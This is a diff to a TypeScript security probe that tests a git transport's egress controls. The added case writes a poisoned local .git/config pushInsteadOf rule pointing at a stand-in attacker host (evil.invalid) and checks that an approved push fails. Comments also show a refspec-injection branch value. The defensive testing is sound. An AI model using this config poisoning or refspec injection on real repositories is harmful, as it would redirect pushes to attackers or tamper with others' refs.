@@ -23,6 +23,9 @@
  *   3b. **No refspec injection.** A push branch like `main:refs/heads/evil` is
  *      rejected even once approved — it cannot touch/delete another ref on the
  *      pinned remote (the push builds a fixed `refs/heads/X:refs/heads/X`).
+ *   3c. **Poisoned local config is rejected.** A workspace `.git/config` with
+ *      `url.*.pushInsteadOf` (which would rewrite the pinned URL) makes the push
+ *      end `failed` — local config can't redirect egress or run helpers/filters.
  *   4. **Clone source allowlist.** A clone of a non-allowlisted URL ends `failed`
  *      and writes nothing.
  *   5. **Clone destination confinement.** A clone whose destination escapes the
@@ -303,6 +306,30 @@ async function run(): Promise<ProbeResult> {
       }
     }
 
+    // ---- 3c. Poisoned local .git/config is rejected -----------------------
+    // A local `url.*.pushInsteadOf` rewrites the operator-pinned URL → it would
+    // redirect the push to an attacker remote. The transport must refuse to run.
+    git(workRepo, ["config", "--local", "url.https://evil.invalid/.pushInsteadOf", bareRemote])
+    const pushPoisoned = await kernel.arbitrate(
+      propose("git.push", {}, contractFor(4, "external", "irreversible")),
+    )
+    const pushPoisonedDone = await kernel.execute(
+      kernel.resolve(pushPoisoned, {
+        kind: "granted",
+        action_id: pushPoisoned.id,
+        request_id: "probe-req-poison",
+        approver_id: "probe.human",
+      }),
+    )
+    if (pushPoisonedDone.phase !== "failed") {
+      return {
+        passed: false,
+        details: `local-config hardening FAILED: an approved push with a poisoned url.*.pushInsteadOf did not end 'failed' (phase=${pushPoisonedDone.phase}) — the pinned URL could be rewritten.`,
+      }
+    }
+    // Restore the workspace config so later sections are unaffected.
+    git(workRepo, ["config", "--local", "--unset", "url.https://evil.invalid/.pushInsteadOf"])
+
     // ---- 4. Clone source allowlist ----------------------------------------
     const cloneBlocked = await kernel.arbitrate(
       propose(
@@ -401,7 +428,7 @@ async function run(): Promise<ProbeResult> {
     return {
       passed: true,
       details:
-        "Native git transport held every egress invariant through the Action Kernel: a host GIT_AUTHOR_NAME did not leak into the commit (author stayed the pinned identity); a push proposed at L4 parked at pending_approval and the ref stayed out of the remote until approval; the approved push landed HEAD in the operator-pinned remote despite a poisoned decoy origin (offline); the configured token never surfaced in inputs or the observation; an approved push with a refspec-injection branch ('main:refs/heads/evil') ended 'failed' and created no stray ref; a non-allowlisted clone source, a path-escaping destination, and a symlink-escaping destination all ended 'failed' writing nothing outside the clone root; and a valid, confined clone completed.",
+        "Native git transport held every egress invariant through the Action Kernel: a host GIT_AUTHOR_NAME did not leak into the commit (author stayed the pinned identity); a push proposed at L4 parked at pending_approval and the ref stayed out of the remote until approval; the approved push landed HEAD in the operator-pinned remote despite a poisoned decoy origin (offline); the configured token never surfaced in inputs or the observation; an approved push with a refspec-injection branch ('main:refs/heads/evil') ended 'failed' and created no stray ref; a poisoned workspace .git/config (url.*.pushInsteadOf) made an approved push end 'failed' rather than redirect the pinned URL; a non-allowlisted clone source, a path-escaping destination, and a symlink-escaping destination all ended 'failed' writing nothing outside the clone root; and a valid, confined clone completed.",
     }
   } finally {
     for (const dir of [workRepo, bareRemote, cloneRoot]) {
